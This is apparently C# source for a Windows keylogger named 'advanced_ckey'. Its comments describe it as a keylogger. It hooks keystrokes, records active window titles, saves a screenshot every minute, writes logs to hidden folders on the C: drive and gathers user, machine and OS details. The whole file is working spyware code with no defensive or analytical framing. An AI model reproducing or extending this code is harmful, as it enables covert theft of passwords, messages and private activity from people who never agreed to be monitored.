using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;
using System.Windows.Forms;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic;
using System.Drawing.Imaging;
using System.IO;
using System.Diagnostics;

namespace advanced_ckey
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            K = new Keyboard();
            InitializeComponent();
            
        }
        private Keyboard _K;

        private Keyboard K
        {
            [MethodImpl(MethodImplOptions.Synchronized)]
            get
            {
                return _K;
            }

            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                if (_K != null)
                {
                    _K.Down -= K_Down;
                }

                _K = value;

                if (_K != null)
                {
                    _K.Down += K_Down;
                }

            }
        }

       
        private string strin = null;


        public string GetActiveWindowTitle()  //get active windows title here
        {
            const int nChars = 256;
        StringBuilder Buff = new StringBuilder(nChars);
        IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }

        private void keyboardLanguages() //this function here is to translate user installed language
        {
            for (var index = 0; index < InputLanguage.InstalledInputLanguages.Count; index++)
            {
                textBox2.Text = InputLanguage.InstalledInputLanguages[index].LayoutName.ToString() + textBox2.Text;
            }
        }

        private void timer1_Tick(object sender, EventArgs e)   //timer1 set to 1 to gets the active windows title at timer 1 ticking
        {
            if (strin != GetActiveWindowTitle())
            {
                textBox1.Text = textBox1.Text + Environment.NewLine + Environment.NewLine + "[" + GetActiveWindowTitle() + "]" + Environment.NewLine;
                strin = GetActiveWindowTitle();
            }
        }

        private void K_Down(string key)
        {
            textBox1.Text += key;   //writes keystokes into textbox1 calling keyboard class to show keystokes 
        }

        public void screenshot()  // the method that handles the screenshot
        {
            string filename = "Screencapture" + DateTime.Now.ToString("ddMMyyyy-hhmmss") + ".png";
            try
            {
                Bitmap captureBitmap = new Bitmap(1024, 768, PixelFormat.Format32bppArgb);

                Rectangle captureRectangle = Screen.AllScreens[0].Bounds;

                Graphics captureGraphics = Graphics.FromImage(captureBitmap);

                captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);

                captureBitmap.Save(@"C:\MyDir\Screenshot\" + filename , ImageFormat.Jpeg);
            }
            catch (Exception)
            {
            }
        }       

        public void savetextfile()    // method saving textfile to file explorer
        {
            try
            {
                File.WriteAllText(@"C:\MyDirr\Keyboard.txt", textBox1.Text);
            }
            catch (Exception)
            {
            }
        }

        DirectoryInfo ch;


        private void Form1_Load(object sender, EventArgs e)
        {
           
            try
            {
                Directory.CreateDirectory(@"C:\MyDir\Screenshot");  // create a diretory for saving the screenshot file
                Directory.CreateDirectory(@"C:\MyDirr");  // create a diretory for saving the screenshot file
                string filepath;
                filepath = @"C:\MyDirr\Keyboard.txt"; //create a text file for saving the keylog
                if (File.Exists(filepath))
                {
                }
                else
                {
                    File.Create(filepath);
                }
            }
            catch (Exception)
            {
            }

            try  //hides keylogger folder
            {
                ch = new DirectoryInfo(@"C:\MyDirr");
                ch.Attributes = FileAttributes.Hidden;
              //  MessageBox.Show("Hidden");
            }
            catch { }

            try  //hides keylogger folder
            {
                ch = new DirectoryInfo(@"C:\MyDir");
                ch.Attributes = FileAttributes.Hidden;
                //  MessageBox.Show("Hidden");
            }
            catch { }


            //try
            //{

            //    ch = new DirectoryInfo(txtFilePath.Text);
            //    ch.Attributes = FileAttributes.Normal;
            //      MessageBox.Show("Visible");

            //}
            //catch { }


            keylog_timer.Start();   // write textbox1.text strings into a file
            Sceenshot_timer.Start();  //starts sccenshot timer at every 1 minutes
            keyboardLanguages();  //get the keyboard language {input keyboard language installed}
           keylog_infomation();  // calls keylog_information
        }

        public void keylog_infomation()
        {
            var switchExpr = Properties.Settings.Default.browser;
            switch (switchExpr)
            {
                case 0:
                    {
                        Properties.Settings.Default.browser = 1;
                        Properties.Settings.Default.Save();
                        Properties.Settings.Default.Reload();
                        break;
                    }

                case 1:
                    {
                        timer4.Start();  // if case 1 clears saved web browser content
                        break;
                    }

                case 2:
                    {
                        break;
                    }

                default:
                    {
                        break;
                    }
            }

            textBox1.Text = DateTime.Now + Environment.NewLine + Environment.NewLine;  // get the present time of the day


            try
            {
                textBox1.Text = Environment.NewLine + textBox1.Text + "User Name:             " + Environment.UserName.ToString();  // gives information about the operating system
                textBox1.Text = textBox1.Text + Environment.NewLine + "Computer Name:         " + Environment.MachineName.ToString();    // gives information about the operating system
                textBox1.Text = textBox1.Text + Environment.NewLine + "OS Version:            " + Environment.OSVersion.ToString();     // gives information about the operating system
                textBox1.Text = textBox1.Text + Environment.NewLine + "Runtime:               " + Environment.Version.ToString();      // gives information about the operating system
                textBox1.Text = textBox1.Text + Environment.NewLine + "System Root:           " + Environment.SystemDirectory.ToString();    
                textBox1.Text = textBox1.Text + Environment.NewLine + "User Domain Name:      " + Environment.UserName.ToString();     
                textBox1.Text = textBox1.Text + Environment.NewLine + Environment.NewLine;

                K.CreateHook();   // this is the code that takes the keystroke from the keyboard class we created
                timer1.Start();   // gets active window name and if not wanted delete this line of code
               
            }
            catch (Exception)
            {
            }
       
        }
       
        private void keylog_timer_Tick(object sender, EventArgs e)
        {
            savetextfile();
        }

        private void Sceenshot_timer_Tick(object sender, EventArgs e)
        {
            screenshot();
        }

        [DllImport("user32.dll", EntryPoint = "ToUnicodeEx", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern int ToUnicodeEx(Keys wVirtKey, uint wScanCode, byte[] lpKeyState, StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);


        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Application.Exit();
        }
    }
}

  

